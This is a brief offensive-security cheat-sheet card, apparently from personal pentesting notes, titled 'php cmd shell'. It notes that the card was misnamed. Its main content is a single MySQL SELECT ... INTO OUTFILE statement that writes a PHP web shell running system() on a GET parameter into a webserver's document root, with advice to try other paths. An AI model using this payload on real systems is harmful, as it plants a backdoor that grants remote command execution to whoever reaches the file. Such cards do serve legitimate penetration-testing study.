# php cmd shell

- this card is messed up. its name was "linux" and lots of things are linked to it assuming it was a linux hub at the time.

Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```
